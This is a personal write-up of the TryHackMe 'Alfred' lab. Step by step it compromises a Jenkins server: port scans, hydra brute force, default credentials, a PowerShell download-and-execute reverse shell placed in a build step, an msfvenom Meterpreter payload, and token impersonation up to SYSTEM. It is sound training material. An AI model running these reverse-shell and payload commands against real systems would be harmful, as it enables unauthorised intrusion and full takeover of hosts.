[<- home](/)

# Alfred [TryHackMe]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Metasploit Exploitation_
<sub>This is a TryHackMe walkthrough room and it details metasploit steps for exploitation, so we will have to follow it.</sub>

Let's define a host machine's IP in a variable:

```
h0st=10.10.10.10
```

Let's define the target machine's IP address in a variable:

```
targ3t=10.10.163.191
```

Let's see what `nmap` can show us about this target. It doesn't respond to ping, so we are adding a `-Pn` flag to it:

```
nmap -A -Pn $targ3t -oN general.scan -vv
```

On port 80 we have what looks like a static site. On port 8080, there seems to be a login form. And 3389 seems like an RDP. Let's start with the `gobuster` and closely follow it with a `feroxbuster`:

```
gobuster dir -u http://$targ3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://targ3t -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -o ferox.scan
```

`feroxbuster` didn't find much, I'm wondering if gobuster will find anything, but before then I'll fill in the answer on THM:

- There are only **3** tcp ports open;

Now I think we can try and brute force the login form at port `8080` with `hydra` using `alfred` as username. let's try it:

```
hydra -l alfred -P /usr/share/wordlists/rockyou.txt $targ3t -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=Invalid" -vV
```

It didn't find anything, and then I noticed on the room's walkthrough page, the question asks for `*****:*****` format user password, which means `alfred` cannot be the username. So I googled what default credentials for Jenkins are and apparently it's `admin:admin`:

- The username and password for the login panel are **admin:admin**

Now that we logged in, the walkthrough tells us to find a way on this system to execute commands on the server. On the dashboard, under the project options, if we click **configure** it will take us to a build section that executes code.

First, let's download `Invole-PowerShellTcp.ps1` script:

```
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
```

Then let's start a python server:

```
python -m http.server 8123
```

After that let's copy the PS command in the walkthrough and insert it in the configuration input:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

Before we save this, let's start netcat in another shell:

```
nc -lvnp 9999
```

After this let's go back to the project options and press **Build Now**. In a few seconds we will receive a shell on netcat!

This is a PS Shell so the following commands apply to get the flag:

```
Set-Location -Path C:\Users\bruce\Desktop
Get-ChildItem
Get-Content user.txt
```

Next, the walkthrough details a way to use `metasploit` to change shell from PS to `meterpreter`:

```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
```

Now we need to upload this as a reverse shell and then use `msfconsole` to convert it to meterpreter. First we need to start the python server again:

```
python -m http.server 8000
```

Let's answer the room's question while we're at it:

- The final size of the generated exe payload is **73802** bytes

Now let's use modified `PowerShell` command in the Jenkins project:

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```

This command has to be above the previous `PowerShell` command that we have injected, it will not work otherwise.

Press `save` but don't `build now` yet. 

Now let's set up everything in metasploit console:

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <ATTACKER IP>
set LPORT <ATTACKER PORT>
run
```

Now let's go back to Jenkins project and press **Build Now**.

And we have received a meterpreter shell:

```
meterpreter >
```

Now back in the first shell (the one we obtained with `netcat`) see what privileges are available:

```
whoami /priv
```

As walkthrough denotes we have `SeDebugPrivilege` and `SeImpersonatePrivilege` enabled. So we are going to have to exploit them with meterpreter:

```
load incognito
```

Let's see available tokens in `meterpreter`'s `incognito` module:

```
list_tokens -g
```

`BUILTIN\Administrators` token is available, let's use it:

```
impersonate_token "BUILTIN\Administrators"
getuid
```

- `getuid` command returns `NT AUTHORITY\SYSTEM`.


Let's try to migrate to `services.exe` process as the walkthrough indicates:

```
ps
migrate 668
```

Let's read the root file now located at: `C:\Windows\System32\config`

```
cat c:/Windows/System32/config/root.txt
```

We got a root flag! 
